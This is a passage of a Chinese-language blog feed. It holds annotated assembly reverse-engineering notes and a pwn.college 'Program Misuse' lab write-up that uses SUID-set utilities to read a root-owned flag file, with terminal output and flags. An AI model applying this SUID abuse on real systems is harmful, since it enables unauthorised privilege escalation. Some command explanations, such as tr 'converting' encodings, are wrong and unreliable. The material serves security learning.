dec    esi                      ; 内层循环计数器递减    jne    SHORT $LL3@s              ; 如果未达到内层循环次数，则跳转继续内层循环    dec    edi                      ; 外层循环计数器递减    jne    SHORT $LL6@s              ; 如果未达到外层循环次数，则跳转继续外层循环; 恢复保存的寄存器，并清理栈    pop    edi    pop    esi    ret    0                        ; 函数返回，不带返回值?s@@YAXPAN00@Z  ENDP   ; s 函数结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">M</span>    <span class="token expression"><span class="token number">100</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span>    <span class="token expression"><span class="token number">200</span></span></span><span class="token keyword">void</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">*</span>b<span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">*</span>c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>M<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token operator">*</span>M<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>b<span class="token operator">+</span>i<span class="token operator">*</span>M<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><ol start="2"><li></li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 函数开始，标准的函数框架建立?m@@YAXPAN00@Z PROC; m, COMDAT    push   ebp    mov    ebp, esp    push   ecx                     ; 保存ecx    push   ecx                     ; 这里重复push ecx可能是为了对齐栈或者保留空间(MSVS的怪癖代码)    mov    edx, DWORD PTR _a$[ebp] ; edx &#x3D; _a$ (起始地址)    push   ebx                     ; 保存ebx    mov    ebx, DWORD PTR _c$[ebp] ; ebx &#x3D; _c$ (目标地址或另一个起始地址)    push   esi                     ; 保存esi    mov    esi, DWORD PTR _b$[ebp] ; esi &#x3D; _b$ (可能的结束地址或偏移量); 计算数组长度或偏移    sub    edx, esi                ; 计算长度或偏移1;edx&#x3D;edx-esi&#x3D;ptr(a-b)    push   edi                     ; 保存edi    sub    esi, ebx                ; 计算长度或偏移2，注意这里的操作似乎与预期逻辑不符，需结合具体算法理解;esi&#x3D;esi-ebx&#x3D;ptr(b-c); 初始化循环计数器    mov    DWORD PTR tv315[ebp], 100  ; 外层循环计数器设为100;tv315&#x3D;100$LL9@m:                              ; 外层循环开始    mov    eax, ebx                ; eax &#x3D; ebx&#x3D;c，可能用于地址计算    mov    DWORD PTR tv291[ebp], 300  ; 内层循环计数器设为300;tv291&#x3D;300$LL6@m:                              ; 内层循环开始    fldz                           ; 加载0.0到FPU堆栈，准备累加    lea    ecx, DWORD PTR [esi+eax] ; 计算当前处理元素的地址;ecx&#x3D;b    fstp   QWORD PTR [eax]         ; 将0.0存入eax指向的位置，清0,此时eax指向c;*c&#x3D;0位于第二层循环，eax作为循环的指针    mov    edi, 200                ; edi作为计数器;edi&#x3D;200$LL3@m:                              ; 第三层循环开始    dec    edi                     ; 循环计数器递减    fld    QWORD PTR [ecx+edx]     ; 从当前地址加上之前计算的偏移处取元素，推入FPU栈;ecx+edx&#x3D;b+a-b&#x3D;a    fmul   QWORD PTR [ecx]         ; 将栈顶元素与ecx地址处的元素相乘 *a&#x3D;*ax*b+c    fadd   QWORD PTR [eax]         ; 将乘积与eax地址处的元素相加，并将结果放回eax地址,c    fstp   QWORD PTR [eax]         ; 弹出FPU栈顶元素（已无用）;这里的运算与edi无关    jne    SHORT $LL3@m             ; 若edi非零，继续内层循环    add    eax, 8                  ; eax指向下一个元素    dec    DWORD PTR tv291[ebp]     ; 内层循环计数器递减    jne    SHORT $LL6@m             ; 若内层计数器非零，继续内层循环    add    ebx, 800                ; ebx增加800，可能用于处理下一批数据    dec    DWORD PTR tv315[ebp]     ; 外层循环计数器递减    jne    SHORT $LL9@m             ; 若外层计数器非零，继续外层循环; 清理并返回    pop    edi    pop    esi    pop    ebx    leave                          ; 恢复ebp和esp    ret    0                       ; 函数返回?m@@YAXPAN00@Z ENDP                   ; m函数结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> tv315 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> tv291 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token operator">+</span>tv315<span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>tv291<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> edi <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token operator">+</span>tv315<span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>tv291<span class="token punctuation">)</span><span class="token operator">+=</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">+</span>tv315<span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>tv291<span class="token punctuation">)</span><span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>b<span class="token operator">+</span>tv315<span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>tv291<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li></li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_array$ &#x3D; 8_x$ &#x3D; 12_y$ &#x3D; 16_f      PROC        mov     eax, DWORD PTR _x$[esp-4];eax&#x3D;x;        mov     edx, DWORD PTR _y$[esp-4];edx&#x3D;y;        mov     ecx, eax;ecx&#x3D;x;        shl     ecx, 4;x*2^4;        sub     ecx, eax;ecx&#x3D;15x        lea     eax, DWORD PTR [edx+ecx*8];eax&#x3D;y+120x        mov     ecx, DWORD PTR _array$[esp-4];ecx&#x3D;8        fld     QWORD PTR [ecx+eax*8]        ret     0_f      ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">double</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">double</span> array<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> array<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnCollege记录</title>
      <link href="/2024/05/09/PwnCollege1-ProgramMiuse/"/>
      <url>/2024/05/09/PwnCollege1-ProgramMiuse/</url>
      
        <content type="html"><![CDATA[<h1 id="lecturenotes"><a class="markdownIt-Anchor" href="#lecturenotes"></a> LectureNotes</h1><h2 id="privilege-escalation"><a class="markdownIt-Anchor" href="#privilege-escalation"></a> Privilege Escalation</h2><ul><li>Every process has a user ID (UID) and and a group ID (GID)<ul><li>UID 0: the Linux admin user (root). Needed for:<ul><li>Installing software</li><li>Loading device drivers</li><li>Shutting down/rebooting</li><li>Changing system-wide settings</li><li>Can be used to:<ul><li>open ANY file</li><li>execute any program</li><li>assume any other user/group ID</li><li>debug any program</li></ul></li></ul></li></ul></li></ul><h3 id="linux-permission-model"><a class="markdownIt-Anchor" href="#linux-permission-model"></a> <strong>Linux Permission Model:</strong></h3><p>447</p><ul><li>SUID(Set User ID): execute with the eUID(effective user ID) of the file owner rather than the parent process<ul><li>Reset every time a file’s ownership is changed</li></ul></li><li>SGID(Set Group ID): execute with the eGID(effective Group ID) of the file owner rather than the parent process</li><li>Sticky: used for shared directories to limit file removal to file owners<ul><li>ensures you can only delete files you have created in a shared directory</li></ul></li><li>Effective ID(eUID/eGID): the UID/GID used for most access checks</li><li>Read ID(UID/GID):the “real” user/group ID of the process owner, used for things such as signal checks</li><li>Saved ID: a user/group ID that your process could switch its eUID/eGID to<ul><li>Used for temporarily dropping privileges</li></ul></li></ul><h3 id="useful-commands"><a class="markdownIt-Anchor" href="#useful-commands"></a> Useful Commands:</h3><ul><li><code>id</code>: will list out the IDs of every process on your system</li><li><code>sudo chmod u+s fileName</code>: add the SUID for the given file</li><li><code>sh -p</code>: ensures that privileges are not dropped when running a program</li></ul><h2 id="sources"><a class="markdownIt-Anchor" href="#sources"></a> Sources:</h2><ul><li><a href="https://pwn.college/modules/misuse">pwn.college Module 2 Lectures</a></li><li><a href="https://dojo.pwn.college/challenges/misuse">pwn.college Module 2 Challenges</a></li><li><a href="https://www.twitch.tv/pwncollege">pwn.college Class Twitch Streams</a></li></ul><h1 id="fundamentals"><a class="markdownIt-Anchor" href="#fundamentals"></a> Fundamentals</h1><p><a href="https://www.runoob.com/linux/linux-command-manual.html">Linux 命令大全 | 菜鸟教程 (runoob.com)</a></p><p><a href="https://gnu-linux.readthedocs.io/zh/latest/Chapter01/00_man.html">man 查看帮助手册 — Linux latest 文档 (gnu-linux.readthedocs.io)</a></p><p><a href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p><p><a href="https://gtfobins.github.io/">GTFOBins记录了常见linux软件的提权方式</a></p><p><code>学好English，能看懂man文档</code></p><p><s>看不懂啊</s></p><h2 id="pragram-misuse"><a class="markdownIt-Anchor" href="#pragram-misuse"></a> Pragram Misuse</h2><p>This challenge is part of a series of programs that<br />exposes you to very simple programs that let you directly read the flag.</p><p>“SUID” 指的是 “Set User ID”，是 Unix 和类 Unix 系统上的一种权限位。当一个可执行文件拥有 SUID 权限时，当用户执行该文件时，该文件的所有者的用户 ID 将会被设置为进程的有效用户 ID，而不是执行该文件的用户的用户 ID。这使得该进程以文件所有者的权限来执行，而不是执行该文件的用户的权限。</p><p>通常情况下，普通用户只能以自己的权限执行程序。但是，当一个程序拥有 SUID 权限时，即使是普通用户执行该程序，它也会以文件所有者的权限来执行。这在某些情况下非常有用，比如让普通用户执行某些需要特权权限的任务，而不需要暴露系统管理员密码。</p><p>然而，SUID 也可能存在安全风险，因为它可以被滥用为提升权限攻击的一种手段。因此，必须小心地管理 SUID 权限，并确保只有必要的程序拥有它。</p><p>此专题为SUID安全模块</p><h3 id="level1cat"><a class="markdownIt-Anchor" href="#level1cat"></a> level1(cat)</h3><p><code>cat /flag</code></p><h3 id="level2more"><a class="markdownIt-Anchor" href="#level2more"></a> level2(more)</h3><p><code>more /flag</code></p><h3 id="level3less"><a class="markdownIt-Anchor" href="#level3less"></a> level3(less)</h3><p><code>less /flag</code></p><h3 id="level4tail"><a class="markdownIt-Anchor" href="#level4tail"></a> level4(tail)</h3><p><code>tail /flag</code></p><h3 id="level5head"><a class="markdownIt-Anchor" href="#level5head"></a> level5(head)</h3><p><code>head /flag</code></p><h3 id="level6sort"><a class="markdownIt-Anchor" href="#level6sort"></a> level6(sort)</h3><p><code>sort /flag</code></p><h3 id="level7vim"><a class="markdownIt-Anchor" href="#level7vim"></a> level7(vim)</h3><p><code>vim /flag</code></p><p><code>:q!</code></p><h3 id="level8emacs"><a class="markdownIt-Anchor" href="#level8emacs"></a> level8(emacs)</h3><p><code>emacs /flag</code></p><h3 id="level9nano"><a class="markdownIt-Anchor" href="#level9nano"></a> level9(nano)</h3><p><code>nano /flag</code></p><h3 id="level10rev"><a class="markdownIt-Anchor" href="#level10rev"></a> level10(rev)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level10:/challenge$ <span class="token function">rev</span> /flag<span class="token punctuation">&#125;</span>WzU0NzczLDE1Ml0.moqZisxxzyckvEaw_thAOt6crp8<span class="token punctuation">&#123;</span>egelloc.nwphacker@program-misuse~level10:/challenge$ <span class="token function">rev</span><span class="token punctuation">&#125;</span>WzU0NzczLDE1Ml0.moqZisxxzyckvEaw_thAOt6crp8<span class="token punctuation">&#123;</span>egelloc.nwppwn.college<span class="token punctuation">&#123;</span>8prc6tOAht_waEvkcyzxxsiZqom.0lM1EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level11od"><a class="markdownIt-Anchor" href="#level11od"></a> level11(od)</h3><p>学会用<code>man</code> 不会的工具就 <code>man od</code></p><p>在计算机领域，“od” 是一个常用的指令，通常用于显示文件的八进制内容。以下是一些常见的 “od” 指令选项：</p><ol><li><code>-a</code>：以可打印字符的形式显示文件内容。</li><li><code>-b</code>：以八进制形式显示文件内容。</li><li><code>-c</code>：以字符形式显示文件内容。</li><li><code>-d</code>：以十进制形式显示文件内容。</li><li><code>-h</code>：以十六进制形式显示文件内容。</li><li><code>-t [format]</code>：指定输出格式，如 <code>-t x1</code> 可以将输出格式指定为每个字节以十六进制显示。</li><li><code>-A</code> 显示地址</li></ol><p><code>tr</code> 命令用于字符替换或删除。以下是一些常见的 <code>tr</code> 命令用法：</p><ol><li><strong>替换字符</strong>：使用 <code>-s</code> 选项来指定要替换的字符集合。例如，将文件中的所有小写字母替换为大写字母：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'a-z'</span> <span class="token string">'A-Z'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>删除字符</strong>：使用 <code>-d</code> 选项来删除指定的字符。例如，删除文件中的所有数字：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'0-9'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>转换字符</strong>：使用 <code>-c</code> 选项来对字符进行转换。例如，将文件中的所有小写字母转换为大写字母，同时删除其他字符：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'a-zA-Z'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>压缩字符</strong>：使用 <code>-s</code> 选项来压缩字符。例如，将文件中连续重复的空格替换为单个空格：</li></ol><pre class="line-numbers language-none"><code class="language-none">tr -s &#39; &#39; &lt; input.txt &gt; output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>转换字符编码</strong>：可以使用 <code>tr</code> 命令将一个字符集映射为另一个字符集。例如，将 ISO-8859-1 编码的文本转换为 UTF-8 编码：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'ISO-8859-1'</span> <span class="token string">'UTF-8'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level11:/challenge$ od <span class="token parameter variable">-An</span> <span class="token parameter variable">-a</span> /flag <span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">" <span class="token entity" title="\n">\n</span>"</span>pwn.college<span class="token punctuation">&#123;</span>EjkuFmjnR3PYcvBLt1eB2aHqJG_.01M1EDLzczN0UzW<span class="token punctuation">&#125;</span>nl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level12hexdump"><a class="markdownIt-Anchor" href="#level12hexdump"></a> level12(hexdump)</h3><p><code>hexdump -v -e '/1 &quot;%_p&quot;' /flag</code></p><p>这个命令中的参数解释如下：</p><ul><li><code>-v</code>：指定静默模式。这将禁止 hexdump 在输出中显示重复的行。</li><li><code>-e</code>：指定格式化输出的模板。在这个模板中，<code>/1</code> 表示按字节处理文件，<code>&quot;%_p&quot;</code> 则表示打印可打印字符。</li></ul><p>以下是一些常用的 <code>hexdump</code> 指令选项：</p><ol><li><p><code>-C</code>：以十六进制和ASCII字符的形式显示文件内容，每个字节对应一个十六进制数字和一个ASCII字符。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-C</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>-c</code>：以字符形式显示文件内容，同时显示每个字符的八进制值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-c</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>-n</code>：限制显示的字节数。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-n</span> <span class="token number">100</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>-s</code>：从指定的偏移量开始显示文件内容。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-s</span> <span class="token number">100</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>-v</code>：关闭默认的输出格式，以原始的十六进制或八进制格式显示数据。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-v</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>这些是常用的 <code>hexdump</code> 指令选项，可以根据具体的需求选择合适的选项来查看文件的内容。</p><h3 id="level13xxd"><a class="markdownIt-Anchor" href="#level13xxd"></a> level13(xxd)</h3><p><code>xxd /flag</code></p><h3 id="level14base32"><a class="markdownIt-Anchor" href="#level14base32"></a> level14(base32)</h3><p><code>base32 /flag |base32 -d</code></p><h3 id="level15base64"><a class="markdownIt-Anchor" href="#level15base64"></a> level15(base64)</h3><p><code>base64 /flag |base64 -d</code></p><h3 id="level16split"><a class="markdownIt-Anchor" href="#level16split"></a> level16(split)</h3><blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">split</span> <span class="token punctuation">[</span>-b byte<span class="token punctuation">]</span><span class="token punctuation">[</span>-C <span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token punctuation">[</span>-l rowcount<span class="token punctuation">]</span><span class="token punctuation">[</span>the <span class="token function">file</span> to split<span class="token punctuation">]</span><span class="token punctuation">[</span>the prefix of the output_file<span class="token punctuation">]</span><span class="token punctuation">[</span>-a suffix_len<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><code>split</code> 命令用于将文件拆分成多个更小的文件。它是一个在 Unix 和类 Unix 系统中常见的命令行工具。<code>split</code> 命令通常用于需要将大文件分割成多个较小文件以便进行传输、备份或处理的情况。</p><p>以下是 <code>split</code> 命令的一般格式：</p><pre class="line-numbers language-none"><code class="language-none">split [OPTION]... [INPUT [PREFIX]]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中：</p><ul><li><code>OPTION</code>：是一些选项，可以用来控制拆分的行为。</li><li><code>INPUT</code>：是要拆分的输入文件的名称。</li><li><code>PREFIX</code>：是输出文件的前缀。输出文件的名称将以此前缀开始，后面跟着一个字母序号以区分不同的输出文件。</li></ul><p>常用的选项包括：</p><ul><li><code>-b, --bytes=SIZE</code>：按大小拆分文件。SIZE 可以是以 <code>k</code>、<code>M</code>、<code>G</code> 等为单位的文件大小。</li><li><code>-l, --lines=NUMBER</code>：按行数拆分文件。</li><li><code>-d</code>：使用数字后缀而不是字母后缀。</li><li><code>-a, --suffix-length=N</code>：指定生成的文件名后缀长度。</li><li><code>-n, --number=CHUNKS</code>：指定要生成的文件数量。</li></ul><p>以下是一个示例，将一个文件拆分成每个文件大小为1MB的多个文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">split</span> <span class="token parameter variable">-b</span> 1M largefile.txt splitfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将名为 <code>largefile.txt</code> 的文件拆分成多个大小为1MB的文件，并以 <code>splitfile</code> 作为前缀命名。生成的文件名将以 <code>splitfile</code> 开头，后跟一个字母序号以区分不同的文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level16:/challenge$ <span class="token function">split</span> /flaghacker@program-misuse~level16:/challenge$ <span class="token function">ls</span>babysuid_level16  xaahacker@program-misuse~level16:/challenge$ <span class="token function">cat</span> xaapwn.college<span class="token punctuation">&#123;</span>4EJPD2ROB2wmP5Nv6kDsY6sawPM.0FO1EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level17-gzip"><a class="markdownIt-Anchor" href="#level17-gzip"></a> level17 (gzip)</h3><p><code>zcat</code> 命令是一个用于查看压缩文件内容的命令。它与 <code>cat</code> 命令类似，但是可以直接查看经过压缩的文件，而不需要先解压缩。<code>zcat</code> 实际上是 <code>gzip -d -c</code> 命令的简写，它会解压缩文件并将解压后的内容输出到标准输出。</p><ul><li>-c 表示输出到标准输出</li><li>-d 解压缩</li></ul><p>使用 <code>zcat</code> 命令的格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zcat filename.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将名为 <code>filename.gz</code> 的压缩文件解压缩，并将解压后的内容直接输出到标准输出。你可以通过管道将其与其他命令一起使用，或者重定向到文件中保存。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level17:/$ zcat flag.gz pwn.college<span class="token punctuation">&#123;</span>UePLx3QWU4tdu3DffqC263k2xH.0VO1EDLzczN0Uz<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level18bzip2"><a class="markdownIt-Anchor" href="#level18bzip2"></a> level18(bzip2)</h3><p>与level17类似</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level18:/$ <span class="token function">bzip2</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-c</span> flag.bz2 pwn.college<span class="token punctuation">&#123;</span>kLWPJ4DFr1DV_MV9WKvshGFFn5U.0FM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level19zip"><a class="markdownIt-Anchor" href="#level19zip"></a> level19(zip)</h3><p>以下是一些常用的 <code>zip</code> 命令选项和示例：</p><ol><li><strong>压缩文件</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> archive.zip file1.txt file2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>file1.txt</code> 和 <code>file2.txt</code> 两个文件压缩成一个名为 <code>archive.zip</code> 的压缩文件。</p><ol start="2"><li><strong>压缩目录</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> <span class="token parameter variable">-r</span> archive.zip directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>directory/</code> 目录及其下的所有文件和子目录压缩成一个名为 <code>archive.zip</code> 的压缩文件。</p><ol start="3"><li><strong>添加文件到已存在的压缩文件</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> archive.zip newfile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>newfile.txt</code> 添加到名为 <code>archive.zip</code> 的已存在的压缩文件中。</p><ol start="4"><li><strong>列出压缩文件中的内容</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> <span class="token parameter variable">-l</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会列出名为 <code>archive.zip</code> 的压缩文件中的所有文件和目录。</p><ol start="5"><li><strong>解压缩文件</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将名为 <code>archive.zip</code> 的压缩文件解压缩到当前目录。</p><ol start="6"><li><strong>解压缩到指定目录</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip <span class="token parameter variable">-d</span> /path/to/directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将名为 <code>archive.zip</code> 的压缩文件解压缩到指定的目录 <code>/path/to/directory/</code> 中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level19:/challenge$ <span class="token function">man</span> <span class="token function">zip</span>hacker@program-misuse~level19:/challenge$ <span class="token function">zip</span> flag.zip /flag  adding: flag <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>hacker@program-misuse~level19:/challenge$ <span class="token function">ls</span>babysuid_level19  flag.zipArchive:  flag.zipcaution: filename not matched:  <span class="token parameter variable">-c</span>hacker@program-misuse~level19:/challenge$ <span class="token function">unzip</span> <span class="token parameter variable">-c</span> flag.zip Archive:  flag.zip extracting: flag                    pwn.college<span class="token punctuation">&#123;</span>Ez72p6_sW8GY7XN4ffOXC_GhJmn.0VM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level20tar"><a class="markdownIt-Anchor" href="#level20tar"></a> level20(tar)</h3><p>以下是一些常用的 <code>tar</code> 命令选项和示例：</p><ol><li><strong>创建归档文件</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> archive.tar file1 file2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>file1</code> 和 <code>file2</code> 打包成一个名为 <code>archive.tar</code> 的归档文件。</p><ol start="2"><li><strong>创建带有 gzip 压缩的归档文件</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvzf</span> archive.tar.gz directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>directory/</code> 目录及其下的所有文件和子目录打包成一个名为 <code>archive.tar.gz</code> 的归档文件，并使用 gzip 进行压缩。</p><ol start="3"><li><strong>创建带有 bzip2 压缩的归档文件</strong>：</li></ol><pre 